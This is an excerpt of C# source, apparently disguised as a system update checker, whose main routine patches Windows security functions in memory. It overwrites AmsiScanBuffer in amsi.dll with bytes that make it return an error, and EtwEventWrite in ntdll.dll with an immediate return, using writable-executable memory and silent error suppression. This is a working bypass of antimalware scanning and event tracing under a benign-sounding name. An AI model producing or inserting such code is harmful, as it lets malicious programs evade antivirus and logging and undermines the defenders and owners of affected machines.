...
namespace SystemUpdateService
{
    class UpdateChecker
    {
        ...
        static void PatchFunction(string dllName, string procName, byte[] patch)
        {
            try
            {
                IntPtr hModule = LoadLibrary(dllName);
                ...
                IntPtr pFunc = GetProcAddress(hModule, procName);
                ...
                uint oldProtect;
                virtualProtect(pFunc, (uint)patch.Length,
                    PAGE_EXECUTE_READWRITE, out oldProtect);

                Marshal.Copy(patch, 0, pFunc, patch.Length);

                uint tmp;
                virtualProtect(pFunc, (uint)patch.Length, oldProtect, out tmp);
            }
            catch { }
        }
        ...
        static void Main(string[] args)
        {
            ...
            // AMSI: mov eax, 0x80070057 (E_INVALIDARG) ; ret
            PatchFunction("amsi.dll", "AmsiScanBuffer",
                new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
            // ETW: ret
            PatchFunction("ntdll.dll", "EtwEventWrite",
                new byte[] { 0xC3 });
